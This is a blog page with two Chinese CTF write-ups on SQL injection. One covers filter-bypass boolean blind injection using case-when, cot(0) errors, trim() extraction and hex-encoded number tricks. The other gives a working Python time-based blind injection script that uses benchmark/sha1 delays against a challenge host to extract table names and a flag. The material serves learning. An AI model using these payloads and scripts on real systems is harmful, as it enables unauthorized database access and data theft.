<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">num_waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/i&#x27;</span>,$str))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Huge num detected&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>由于本题只需要登录即可，所以我们只要获取密码就行了，那么就可以利用源码里面自带的查询语句，这样没有select也没关系，但是引号如何闭合绕过呢？<br>查询语句是这样的：<br>那我们只需要在第二个引号的位置加一下反斜杠将它转义，然后将我们要注入的内容放在password字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;select * from users where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$password&#39;&quot;</span><br></pre></td></tr></table></figure>

<p>所以就如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;select * from users where username&#x3D;&#39;$username\&#39; and password&#x3D;&#39;||&#96;username&#96;&#x3D;&#39;admin&#39;后面再加上你的注入语句#&quot;</span><br></pre></td></tr></table></figure>

<h3 id="布尔盲注语句构造"><a href="#布尔盲注语句构造" class="headerlink" title="布尔盲注语句构造"></a>布尔盲注语句构造</h3><h4 id="条件语句的选取："><a href="#条件语句的选取：" class="headerlink" title="条件语句的选取："></a>条件语句的选取：</h4><p>由于比较符号都被过滤了，如果使用if显然是不够的，这里我们使用case when<br>初步语句构造为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case &#39;&#39; when &#39;&#39; then &#39;&#39; else &#39;&#39; end#</span><br></pre></td></tr></table></figure>

<p>后面then和else一个发报错的一个放查询错误的</p>
<h4 id="报错函数选取"><a href="#报错函数选取" class="headerlink" title="报错函数选取"></a>报错函数选取</h4><p>报错函数可以用cot(0)或者exp(9999999999999999)都是三角函数</p>
<h4 id="截取函数选择"><a href="#截取函数选择" class="headerlink" title="截取函数选择"></a>截取函数选择</h4><p>由于这里将substr等截取函数都过滤了，所以选择trim()函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">trim(leading&#39;&#39;from&#39;&#39;)rlike(trim(leading&#39;&#39;from&#39;&#39;))</span><br></pre></td></tr></table></figure>

<p>这个语句我们在mysql中测试一下将会更直观一些：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">trim(leading(&#39;a&#39;)from(&#96;password&#96;)) rlike trim(leading(&#39;b&#39;)from(&#96;password&#96;))</span><br></pre></td></tr></table></figure>


<p>和条件语句组合后即为：以下语句的意思即为如果两个trim的结果如果一致则为1 那么就不是0 那么就会返回1，如果两个trim的结果不一致，那么就会返回0就会返回cot(0)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case trim(leading &#39;a&#39; from &#96;password&#96;) rlike trim(leading &#39;b&#39; from &#96;password&#96;) when 0 then cot(0) else 1 end</span><br></pre></td></tr></table></figure>

<p>可以发现如果截取到密码的字符，那么就会返回错误，否则就会返回表，查询结果即为false<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210802162008.png" alt="img" style="zoom:67%;"></p>
<h4 id="长度绕过："><a href="#长度绕过：" class="headerlink" title="长度绕过："></a>长度绕过：</h4><p>由于我们不能输入引号，所以说字符串都需要转为十六进制进行输入，但是转为十六进制的势必会超过9位数，所以我们可以利用hex和unhex函数缩短长度：<br>先用十进制表示转为十六进制的字符串，那么此时 我们就可以用运算符以及科学技术法，那么位数将会减少很多了，最后再将结果转为十六进制即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select admin;</span><br><span class="line">select unhex(hex(4182e8+96719726e0));</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210802171101.png" alt="img" style="zoom:50%;">
但是字符取到后面还是会超过9位，此时需要另一种方法来截取，那就是使用函数嵌套,我们的问题在于，到后面过多的取字符以后比如说密码为abc，取了abc，那么他们即使转为十进制+科学计数法+运算符，也还是会超过9位，所以我们需要使用嵌套，一部分一部分的取，如下
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210803091136.png" alt="img" style="zoom:50%;">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recursion_g_code</span>(<span class="params">l:list</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">g_code</span>(<span class="params">prefix, code</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;trim(leading(<span class="subst">&#123;wrap_str(prefix)&#125;</span>)from(<span class="subst">&#123;code&#125;</span>))&quot;</span></span><br><span class="line">    code = <span class="string">&quot;&#x27;code&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        code = <span class="string">f&#x27;&#x27;&#x27;g_code(&quot;<span class="subst">&#123;i&#125;</span>&quot;, <span class="subst">&#123;code&#125;</span>)&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> eval(code)</span><br></pre></td></tr></table></figure>

<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>我自己肯定写不出来这么厉害的脚本。。。代码编写能力还是太差，所以就仿照一下自己理解的编写一下：<br>首先是第一段<br><strong>字符串转数字：</strong><br>通过每次取余八位，将后面的数字内容先截取出来，然后转变为科学计数法，然后再将剩下的数字以科学计数法表示</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long<span class="comment">#从crypto中导入bytes_to_long函数，这个函数可以将字符串转为长整数</span></span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;字符串转unhex(hex())&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrap_str</span>(<span class="params">s:str</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">split_num</span>(<span class="params">num:int</span>):</span></span><br><span class="line">        p=<span class="number">8</span></span><br><span class="line">        m=pow(<span class="number">10</span>,p)</span><br><span class="line">        parts=[]</span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> num &gt;<span class="number">0</span>:</span><br><span class="line">            parts.insert(<span class="number">0</span>,<span class="string">f&quot;<span class="subst">&#123;num % m&#125;</span>e<span class="subst">&#123;i&#125;</span>&quot;</span>)<span class="comment">#insert函数是对list进行操作，表示，第一个数字表示操作的位置，第二个表示插入的内容</span></span><br><span class="line">            i+=p</span><br><span class="line">            num = num // m</span><br><span class="line">        <span class="keyword">if</span> i &gt;=<span class="number">100</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;todo&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;+&quot;</span>.join(parts)</span><br><span class="line">    s=s.encode()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;unhex(hex(<span class="subst">&#123;split_num(bytes_to_long(s))&#125;</span>))&quot;</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210803104243.png" alt="img" style="zoom:67%;">

<p><strong>第二段 trim的套娃</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recursion_g_code</span>(<span class="params">l:list</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">g_code</span>(<span class="params">prefix, code</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;trim(leading(<span class="subst">&#123;wrap_str(prefix)&#125;</span>)from(<span class="subst">&#123;code&#125;</span>))&quot;</span></span><br><span class="line">    code = <span class="string">&quot;&#x27;code&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        code = <span class="string">f&#x27;&#x27;&#x27;g_code(&quot;<span class="subst">&#123;i&#125;</span>&quot;, <span class="subst">&#123;code&#125;</span>)&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> eval(code)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">trim(leading(unhex(hex(5033e8+70115431e0)))from(trim(leading(unhex(hex(30057e0)))from(trim(leading(unhex(hex(12851e0)))from(trim(leading(unhex(hex(26472e0)))from(trim(leading(unhex(hex(30073e0)))from(trim(leading(unhex(hex(26674e0)))from(trim(leading(unhex(hex(26983e0)))from(trim(leading(unhex(hex(29301e0)))from(trim(leading(unhex(hex(26472e0)))from(trim(leading(unhex(hex(25970e0)))from(code))))))))))))))))))))rlike(trim(leading(unhex(hex(5033e8+70115432e0)))from(trim(leading(unhex(hex(30057e0)))from(trim(leading(unhex(hex(12851e0)))from(trim(leading(unhex(hex(26472e0)))from(trim(leading(unhex(hex(30073e0)))from(trim(leading(unhex(hex(26674e0)))from(trim(leading(unhex(hex(26983e0)))from(trim(leading(unhex(hex(29301e0)))from(trim(leading(unhex(hex(26472e0)))from(trim(leading(unhex(hex(25970e0)))from(code)))))))))))))))))))))</span><br></pre></td></tr></table></figure>


<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210803160017.png" alt="img" style="zoom:67%;">

<p>可以看到分别是对这三个部分进行递归嵌套</p>
<h2 id="知识点小结："><a href="#知识点小结：" class="headerlink" title="知识点小结："></a>知识点小结：</h2><p>1.引号绕过，两个参数均可控的情况下<br>2.case when else end<br>3.trim函数截取<br>4.字符串转化为大数化短<br>5.记一点小坑，就是在post请求的时候需要allow_redirects=False，否则的话无法接收到正确的报文，原因是源码中在post请求后会有header(location)进行重定向</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/01/sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">sql时间盲注</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-01</time><div class="content"><h2 id="前期测试"><a href="#前期测试" class="headerlink" title="前期测试"></a>前期测试</h2><h3 id="确定注入点以及过滤内容"><a href="#确定注入点以及过滤内容" class="headerlink" title="确定注入点以及过滤内容"></a>确定注入点以及过滤内容</h3><p>发现username必须是admin，如果不是admin混有其他字符的话就会返回you are not admin，但是password可以注入，先fuzz一下过滤的字符，过滤substr、union等字符，也过滤了sleep，同时还过滤了空格</p>
<h3 id="确定注入类型"><a href="#确定注入类型" class="headerlink" title="确定注入类型"></a>确定注入类型</h3><p>发现不论输入的内容是什么 页面的回显均是password error，所以尝试一下时间盲注的语句，但是过滤了sleep那么就需要使用benchmark，由于substr以及比较符之类的都没了，所以这里就用in了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;or&#x2F;**&#x2F;case&#x2F;**&#x2F;1&#x2F;**&#x2F;when&#x2F;**&#x2F;1&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;benchmark(1000000,sha1(sha1(sha1(sha1(sha1(sha1(sha1(&#39;HWG&#39;))))))))end#</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210805171825.png" alt="img" style="zoom:67%;">

<h3 id="编写盲注脚本："><a href="#编写盲注脚本：" class="headerlink" title="编写盲注脚本："></a>编写盲注脚本：</h3><p>一开始在写的时候 忘记ascii不见了，所以写的还挺顺的，后来发现不见了，于是就要重新修改一下，想到之前刚学的hex于是就用hex进行书写一下试试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">url=<span class="string">&quot;http://a.y1ng.vip:1102/index.php&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_tran</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hex(s).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tran_str</span>(<span class="params">g</span>):</span></span><br><span class="line">    tran_tmp=<span class="string">&quot;&quot;</span></span><br><span class="line">    g = binascii.unhexlify(g)</span><br><span class="line">    print(g.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    tran_tmp=g</span><br><span class="line">    print(tran_tmp[::<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">return</span> tran_tmp[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection</span>(<span class="params">payload:str</span>):</span></span><br><span class="line">    wd_tr=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            payload_fina=<span class="string">f&quot;1&#x27;or/**/case/**/(select/**/hex(right((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;j&#125;</span>))/**/in/**/(&#x27;<span class="subst">&#123;hex_tran(i)+wd_tr&#125;</span>&#x27;))/**/when/**/1/**/then/**/benchmark(100000,sha1(sha1(sha1(sha1(sha1(sha1(sha1(&#x27;HWG&#x27;))))))))/**/else/**/1/**/end#&quot;</span></span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>:payload_fina</span><br><span class="line">            &#125;</span><br><span class="line">            print(data)</span><br><span class="line">            times=time.time()</span><br><span class="line">            r=s.post(url,data=data).text</span><br><span class="line">            <span class="keyword">if</span> time.time()-times &gt;= <span class="number">4</span>:</span><br><span class="line">                wd_tr=<span class="string">f&quot;<span class="subst">&#123;hex_tran(i)&#125;</span>&quot;</span>+wd_tr</span><br><span class="line">                print(wd_tr)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> i==<span class="number">127</span>:</span><br><span class="line">                wd_tr = tran_str(wd_tr)</span><br><span class="line">                print(wd_tr)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#payload=&quot;database()&quot;</span></span><br><span class="line">    <span class="comment">#payload=&quot;select group_concat(table_name) from information_schema.tables where table_schema in (select database())&quot;.replace(&quot; &quot;,&quot;/**/&quot;)</span></span><br><span class="line">    <span class="comment">#payload=&quot;select group_concat(column_name) from information_schema.columns where table_name in (&#x27;Fl49ish3re&#x27;)&quot;.replace(&quot; &quot;,&quot;/**/&quot;)</span></span><br><span class="line">    payload=<span class="string">&quot;select group_concat(f1aG123) from Fl49ish3re&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)<span class="comment">#flag&#123;08e687c1-cc68-4db0-9924-407792caf20e&#125;</span></span><br><span class="line">    sql_injection(payload)</span><br></pre></td></tr></table></figure>

<p>但是发现只能打印一部分表的感觉，但是ascii码表都齐了呀–就很奇怪。。。在本地测试了一下，因为我们是十六进制的，所以会出现abcdef这些字母，但是在mysql中 这些字母是大写的，但是在python中的转化结果是小写的，然后我们还使用了binary，区分大小写，所以就跑不出来了，这里我们可以将binary去掉，这样就没关系了</p>
<h4 id="卡壳点"><a href="#卡壳点" class="headerlink" title="卡壳点"></a>卡壳点</h4><p>主要是还是编程能力太弱，还需多加锻炼<br>然后就是那个binary区分大小写的，如果是用字符去注的话就需要区分了，但是这里不是，直接用十六进制就不用了</p>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>